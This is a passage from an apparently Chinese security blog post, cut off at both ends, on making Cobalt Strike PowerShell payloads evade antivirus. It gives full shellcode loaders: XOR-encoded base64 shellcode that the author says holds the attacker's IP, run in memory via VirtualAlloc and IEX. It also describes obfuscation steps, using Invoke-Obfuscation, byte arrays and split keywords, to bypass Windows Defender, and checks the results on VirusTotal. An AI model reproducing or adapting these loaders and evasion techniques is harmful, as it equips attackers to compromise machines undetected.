class="hljs-string"></span><br><span class="hljs-string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuAPCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMeXZPYiMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCgNvYWFxbHRwZnEuKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXfyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEBoNEhMVDRITFw0SEBQjIyMjIw==&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>分别用Windows Defender测试每一段代码，发现在<code>$var_code</code>中报毒<br>进一步对<code>$var_code</code>解码（我本地base64解出来都是乱码，挺怪的）<br>看别人的结果说能得到一串ASCII字符，而ASCII解码后得到一堆乱码，但在最后，可以发现攻击者的IP，也没什么其他可以获取的信息了</p><blockquote><p>总的来说  powershell的上线方式就是通过VirtualAlloc分配内存然后执行CS的shellcode,shellcode存放在了$var_code变量中</p></blockquote><h2 id="powershell免杀"><a href="#powershell免杀" class="headerlink" title="powershell免杀"></a>powershell免杀</h2><h3 id="工具的使用"><a href="#工具的使用" class="headerlink" title="工具的使用"></a>工具的使用</h3><p>通过对上面hta文件的分析之后，我们知道Windows Defender是对<code>$var_code</code>进行了检测报毒，那我们需要做的就是将该部分进行混淆处理，来绕过Windows Defender的检测<br>这里先推荐一个开源的混淆工具<a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> ./<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1<br><span class="hljs-built_in">Invoke-Obfuscation</span><br></code></pre></td></tr></table></figure><p>根据其步骤安装，运行</p><p><img src="https://s2.loli.net/2022/08/16/4myYitWBsOSNvoJ.png" alt="好酷炫的界面"></p><p>因为没有仔细去研究该工具的使用方法，就直接用的其他大佬的配置<br><code>Set scriptblock &#39;final_base64payload&#39;</code> <code>COMPRESS</code> <code>1</code>,该配置可以绕过Windows Defender，（也可以选择其他混淆方式来绕过不同的防火墙）该工具会根据该配置输出可以绕过Windows Defender的PowerShell命令<br><img src="https://s2.loli.net/2022/08/16/gSbkTOpM3fj1UCV.png"></p><p><code>Out d:payload.ps1</code>将其输出<br><img src="https://s2.loli.net/2022/08/16/CyxmieSZpvrMLEc.png" alt="得到payload.ps1"><br>将其新建的有效载荷替换掉$var_code中的内容，Windows Defender成功绕过</p><p>接着我们把他丢到<a href="https://www.virustotal.com/gui/file/1a2e0851bbae380c43881d70f41835b4a22e74ae2c2daf45593ffb764fc6e9e9?nocache=1">virustotal</a>上看看效果</p><p><img src="https://s2.loli.net/2022/08/16/yg2twhGMiqX6HuQ.png"></p><p><img src="https://s2.loli.net/2022/08/16/EC8iXIbahkVWGSm.png"><br>虽然可以绕过一些大厂的防火墙，例如：微软，腾讯，McAfee<br>但是16/59 感觉还是不太行那我们接下来试试手动免杀</p><h3 id="人工免杀"><a href="#人工免杀" class="headerlink" title="人工免杀"></a>人工免杀</h3><p>我们直接用CS生成一个powershell的payload，不然用之前hta中包含的话，几层base64又压缩啥的太麻烦了<br>先来看看源码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-variable">$DoIt</span> = <span class="hljs-string">@&#x27;</span><br><span class="hljs-string">function func_get_proc_address &#123;</span><br><span class="hljs-string">Param ($var_module, $var_procedure)</span><br><span class="hljs-string">$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span><br><span class="hljs-string">$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span><br><span class="hljs-string">return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function func_get_delegate_type &#123;</span><br><span class="hljs-string">Param (</span><br><span class="hljs-string">[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span><br><span class="hljs-string">[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span><br><span class="hljs-string">)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span><br><span class="hljs-string">$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string">$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">return $var_type_builder.CreateType()</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycktTjiMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMV0saZCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3RsdBUXGAN3UUpHRk1XDBYNExgDbmJwYQouKSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNicyNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMSDRIQEQ0RERQNEREUIyMjIyM=&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span><br><span class="hljs-string">$var_code[$x] = $var_code[$x] -bxor 35</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span><br><span class="hljs-string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span><br><span class="hljs-string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span><br><span class="hljs-string"></span><br><span class="hljs-string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span><br><span class="hljs-string">$var_runme.Invoke([IntPtr]::Zero)</span><br><span class="hljs-string">&#x27;@</span><br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">start-job</span> &#123; <span class="hljs-keyword">param</span>(<span class="hljs-variable">$a</span>) <span class="hljs-built_in">IEX</span> <span class="hljs-variable">$a</span> &#125; <span class="hljs-literal">-RunAs32</span> <span class="hljs-literal">-Argument</span> <span class="hljs-variable">$DoIt</span> | <span class="hljs-built_in">wait-job</span> | <span class="hljs-built_in">Receive-Job</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">IEX</span> <span class="hljs-variable">$DoIt</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>与之前的一样，我们需要添加混淆的还是<code>$var_code</code><br>思路是将base64编码换掉，因为base64编码会被杀掉，改成byte数组<br><img src="https://s2.loli.net/2022/08/16/uT4nE71YSL5rpxf.png"></p><p>这可能就是传说中的FromBase65String？<br>将<code>$var_code</code>改掉</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br></code></pre></td></tr></table></figure><p>现在再拿到virustotal上面去看看<br><img src="https://s2.loli.net/2022/08/16/WdOi26SaTtkljQG.png"></p><p>离大谱，32/59不得不说，安全厂商估计也是天天在网上学习新的免杀方式</p><p>这里参考了Y4er师傅的处理方法，主要部分就是更改了关键字，</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs dns">Set-StrictMode -Version <span class="hljs-number">2</span><br><br>$DoIt = @&#x27;<br>function func_b &#123;<br>Param ($amodule, $aprocedure)<br>$aunsafe_native_methods = ([AppDomain]<span class="hljs-number">::</span>CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-<span class="hljs-number">1</span>].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.Uns&#x27;+&#x27;afeN&#x27;+&#x27;ativeMethods&#x27;)<br>$agpa = $aunsafe_native_methods.GetMethod(&#x27;GetP&#x27;+&#x27;rocAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))<br>return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($amodule)))), $aprocedure))<br>&#125;<br><br>function func_a &#123;<br>Param (<br>[Parameter(Position = <span class="hljs-number">0</span>, Mandatory = $True)] [Type[]] $aparameters,<br>[Parameter(Position = <span class="hljs-number">1</span>)] [Type] $areturn_type = [Void]<br>)<br><br>$atype_b = [AppDomain]<span class="hljs-number">::</span>CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;Reflect&#x27;+&#x27;edDel&#x27;+&#x27;egate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]<span class="hljs-number">::</span>Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDeleg&#x27;+&#x27;ateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])<br>$atype_b.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]<span class="hljs-number">::</span>Standard, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br>$atype_b.DefineMethod(&#x27;Inv&#x27;+&#x27;oke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $areturn_type, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br><br>return $atype_b.CreateType()<br>&#125;<br><br>[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span 